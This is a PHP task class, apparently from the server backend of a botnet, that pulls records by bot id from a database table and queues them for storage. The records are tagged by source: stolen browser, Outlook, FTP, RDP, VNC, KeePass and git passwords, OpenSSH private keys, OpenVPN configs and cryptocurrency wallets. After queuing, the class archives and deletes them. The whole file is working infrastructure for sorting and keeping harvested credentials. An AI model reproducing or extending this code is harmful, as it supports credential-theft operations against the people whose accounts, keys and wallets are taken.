<?php defined('SYSPATH') or die('No direct script access.');

class Task_Brow_Queue extends Minion_Task {

    protected $_options = [
        'type' => NULL,
        'name' => NULL,
        'src' => NULL,
    ];

    private static $src = [
        'openssh' => 'OpenSSH private keys',
        'openvpn' => 'OpenVPN passwords and configs',
    ];

    private static $sources = [
        'access' => [
            'IE passwords',
            'Edge passwords',
            'chrome passwords',
            'firefox passwords',
        ],
        'pwgrab' => [
            'Outlook passwords',
            'FileZilla passwords',
            'WinSCP passwords',
            'PuTTY passwords',
            'VNC passwords',
            'RDP passwords',
            'TV passwords',
            'git passwords',
//            'OpenVPN passwords and configs',
//            'OpenSSH private keys',
            'KeePass passwords',
            'Precious files',
            'AnyConnect',
        ],
        'credentials' => [
            'IE passwords',
            'Edge passwords',
            'chrome passwords',
            'firefox passwords',
            'Outlook passwords',
            'FileZilla passwords',
            'WinSCP passwords',
            'PuTTY passwords',
            'VNC passwords',
            'RDP passwords',
            'SQLSCAN',
            'OWA passwords',
            'Precious files',
            'TV passwords',
            'bitcoin',
            'putty',
            'cert',
            'litecoin',
            'url passwords',
            'git passwords',
            'OpenVPN passwords and configs',
            'OpenSSH private keys',
            'KeePass passwords',
            'Precious files',
            'AnyConnect',
        ]
    ];

	protected function _execute(array $params){
        $limit = 1000;
        if($params['type'] == 82){
            $limit = 100;
        }
        $id_low = DB::expr('id_low AS cid0');
        $id_high = DB::expr('id_high AS cid1');
        $query = DB::select($id_low, $id_high, 'group', 'os', 'os_ver', 'data', 'source', 'created_at', 'type')
            ->from(Kohana::$config->load('init.tables.brow'))
            ->where('type', '=', $params['type']);

        if($params['type'] == 81){
            if($params['name'] == 'access'){
                $query->and_where('source', 'IN', self::$sources['access']);
            }elseif ($params['name'] == 'pwgrab'){
                if(!$params['src']){
                    $query->and_where('source', 'IN', self::$sources['pwgrab']);
                }else{
                    $query->and_where('source', '=', self::$src[$params['src']]);
                }
            }elseif ($params['name'] == 'credentials'){
                $query->and_where('source', 'NOT IN', self::$sources['credentials']);
            }
        }

        $records = $query->limit($limit)
            ->execute()
            ->as_array();

        $client = Task_Helper::getStorageClient();

        $delete = [];
        $db_delete = DB::delete('data80');

        foreach($records as $r){
//            $mark_del = true;

            if($params['type'] == 81){
                if($params['name'] == 'access'){
                    $client->addTaskHighBackground("Insert:Browser:Access", json_encode($r));
                }elseif ($params['name'] == 'credentials'){
//                    $mark = true;
//                    foreach(self::$sources['credentials'] as $item){
//                        if(preg_match('#'.$item.'#', $r['source'])){
//                            $mark = false;
//                            break;
//                        }
//                    }
//                    if($mark){
                    if(self::check($r['source'])){
                        $client->addTaskHighBackground("Insert:Browser:Credentials", json_encode($r));
                    }
//                    else{
//                        $mark_del = false;
//                    }
                }elseif ($params['name'] == 'pwgrab'){
                    if($params['src']){
                        $client->addTaskHighBackground("Insert:Browser:Pwgrab:".$params['src'], json_encode($r));
                    }else{
                        $client->addTaskHighBackground("Insert:Browser:Pwgrab", json_encode($r));
                    }
                }
            }else{
                $client->addTaskHighBackground("Insert:Browser", json_encode($r));
            }

            $r['id_low'] = $r['cid0'];
            unset($r['cid0']);
            $r['id_high'] = $r['cid1'];
            unset($r['cid1']);

//            if($mark_del){
                $delete[] = Arr::extract($r, ['id_low', 'id_high', 'created_at', 'source', 'type']);

                $db = Database::instance();
                $autoremove_ttl = Kohana::$config->load('init.brow_archive.autoremove_ttl');
                if ($autoremove_ttl) {
                    try {
                        DB::insert('brow_archive', array_keys($r))
                            ->values($r)
                            ->execute($db);
                    } catch(Database_Exception $e) {
                        Kohana::$log->add(Log::ERROR, Kohana_Exception::text($e), null, ['exception' => $e]);
                    }
                }
//            }
        }
        $client->runTasks();

        if($delete){
            $db_delete->where(DB::expr('(id_low, id_high, created_at, source, type)'), 'IN', $delete)
                ->execute();
        }
    }

    private static function check($source){
        $result = true;
        foreach(self::$sources['credentials'] as $item){
            if(preg_match('#'.$item.'#', $source)){
                $result =  false;
            }
        }
        return $result;
    }
}